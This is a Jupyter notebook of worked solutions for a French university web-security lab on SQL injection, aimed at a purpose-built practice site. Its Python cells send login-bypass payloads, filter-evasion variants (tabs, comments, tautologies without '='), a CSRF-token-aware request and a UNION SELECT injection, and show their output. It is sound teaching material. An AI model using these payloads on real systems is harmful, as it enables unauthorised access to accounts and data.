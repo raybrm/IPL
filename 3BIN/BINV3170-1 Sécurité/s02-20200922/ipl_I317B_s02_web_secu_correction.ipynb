{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 2 : Vulnérabilitées web (1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1:\n",
    "Pour ce premier exercice, nous vous demandons de passer le formulaire de connexion codé par un mauvais développeur : http://labosecuipl.alwaysdata.net/20/s02/ex1/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/20/s02/ex1/\",\n",
    "    data={\"login\": \"' or 1=1 or '\",\n",
    "          \"password\": \"\"}\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <?> FROM <?> WHERE <login> = '<user_input>' and <password> = '<user_input2>';"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2a:\n",
    "Une variante du précédent formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/20/s02/ex2a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/20/s02/ex2a/\",\n",
    "    data={\"login\": \"\\\" or 1=1;--\",\n",
    "          \"password\": \"\"}\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <?> FROM <?> WHERE <login> = \"<user_input>\" and <password> = \"<user_input2>\";"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2b:\n",
    "Une variante du précédent formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/20/s02/ex2b/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/20/s02/ex2b/\",\n",
    "    data={\"login\": \"') or 1=1;--\",\n",
    "          \"password\": \"\"}\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <?> FROM <?> WHERE (<login> = \"<user_input>\" and <password> = \"<user_input2>\");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "NB: sans la ), on obtient l'erreur suivante :\n",
    "\n",
    "<b>Warning</b>:  PDO::query(): SQLSTATE[HY000]: General error: 1 near &quot;;&quot;: syntax error in <b>/home/labosecuipl/www/20/s02/ex2b/index.php</b> on line <b>12</b><br />\n",
    "\n",
    "Qui nous indique qu'arriver à la fin de la ligne \";\", il y a une erreur de syntaxe. Ça nous aide à deviner qu'il \"manque un truc fermant\" ..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3:\n",
    "Dans cette nouvelle version, le développeur semble avoir prit conscience que certains caractères ne devraient pas être accepté ... mais vous êtes plus malin que lui, n'est-ce pas ?\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/20/s02/ex3/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/20/s02/ex3/\",\n",
    "    data={\n",
    "        \"login\": \"\\\" or 1<>2;--\".replace(\" \", \"\\t\"),\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n",
      "ok\n"
     ]
    }
   ],
   "source": [
    "# Le site semble faire deux checks :\n",
    "# - pas d'espace\n",
    "#    Replaçons les espaces par autre chose qui agira de la même manière :\n",
    "#    \\t\n",
    "#    \\n\n",
    "#    /**/\n",
    "#\n",
    "# - pas d'égale ... mais bon, faire quelque chose de toujours vrai c'est simple ...\n",
    "#    1<2\n",
    "#    1<>2\n",
    "#    \"1\" LIKE \"1\"\n",
    "#    NULL IS NULL\n",
    "\n",
    "for tautologie in [\"1<>2\", \"1<2\", '\"1\" LIKE \"1\"', \"NULL is NULL\"]:\n",
    "    for blankspace in ['\\n', '\\t', '/**/']:\n",
    "        \n",
    "        injection = (\"\\\" or %s;--\" % tautologie).replace(\" \", blankspace)\n",
    "        # print(\"Inject [%s]\" % injection, end=\" =>\")\n",
    "        \n",
    "        page = requests.post(\n",
    "            \"http://labosecuipl.alwaysdata.net/20/s02/ex3/\",\n",
    "            data={\"login\": injection, \"password\": \"\"}\n",
    "        )\n",
    "        \n",
    "        if \"Good job\" in page.text:\n",
    "            print(\"ok\")\n",
    "        else:\n",
    "            print(\"KO\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### => conclusion, on fait pas ses checks soit même parce qu'il y a pleiiiin de manière de contourner ceux-ci !"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4:\n",
    "\n",
    "Une variante du précédent formulaire a été mit en place, encore une fois, trouvez le moyen de vous y connecter : http://labosecuipl.alwaysdata.net/20/s02/ex4/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "\n",
    "s = requests.Session()\n",
    "\n",
    "page = s.get(\"http://labosecuipl.alwaysdata.net/20/s02/ex4/\")\n",
    "\n",
    "# la méthode vite&moche\n",
    "# print(page.text)\n",
    "# token = page.text.split(\"value='\")[1].split(\"'\")[0]\n",
    "\n",
    "# la méthode BeautifulSoup\n",
    "soup = BeautifulSoup(page.text)\n",
    "token = soup.find(\"input\", {'name': 'token'})['value']\n",
    "\n",
    "page = s.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/20/s02/ex3/\",\n",
    "    data={\"login\": \"\\\" or 1<>2;--\".replace(\" \", \"\\t\"),\n",
    "          \"password\": \"\",\n",
    "          \"token\": token}\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 5:\n",
    "Un espion sur place m'a confirmé que, ne parvenant pas à circonvenir nos injections, le dévelopeur derrière ce site à juste décidé de vider la base de donnée `users`. Il s'est venté bruyament de sa nouvelle idée à coté de la machine à café :\n",
    "\n",
    "> \"J'ai vidé la base de donnée ! Haha ! La requête sql de connexion ne peut plus renvoyé de login utilisateur donc impossible pour eux de se connecter ! Haha, ces maudits hackers ne m'auront pas cette fois-ci !\".\n",
    "\n",
    "Désormait, toutes les requêtes, même injectée \"toujours vraie\" sont vide ... C'est embêtant mais je suis sûr qu'on peut arranger le coup !\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/20/s02/ex5/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/20/s02/ex5/\",\n",
    "    data={\"login\": \"' UNION SELECT \\\"hacked\\\", \\\"hacked2\\\";--\",\n",
    "          \"password\": \"\"}\n",
    ")\n",
    "print(page.text)\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6a:\n",
    "Pour ce nouvel exercice, nous allons utiliser un nouveau formulaire. Ce formulaire nous permet de chercher parmi les éléments du tableau périodique des éléments. Par exemple, si vous cherchez \"Co*\", vous obtiendrez les informations sur le copper (cuivre) et le cobalt.\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/20/s02/ex6/\n",
    "\n",
    "Commencez par récupérer le numéro de version de notre base de donnée. Ici, nous connaissonsle type de base de donnée : SQLITE, un petit détour par la documentation nous permet deconnaître la fonction parfait pour cela : https://www.sqlite.org/lang_corefunc.html#sqlite_version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "#TODO\n",
    "# on y retourne en début de s03"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6b:\n",
    "Dans le même ordre d’idée, je vous invite à récupérer la liste des tables présentes dans cette base de donnée.Comme souvent, la lecture de la documentation peut vous faciliter la vie : https://www.sqlite.org/faq.html#q7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "#TODO\n",
    "# on y retourne en début de s03"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6c:\n",
    "Maintenant que vous connaissez toutes les tables dans cette base de données ainsi que le nomde chaque champ, pourquoi ne pas récupérer le contenu de chacune de ces tables ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "#TODO\n",
    "# on y retourne en début de s03"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
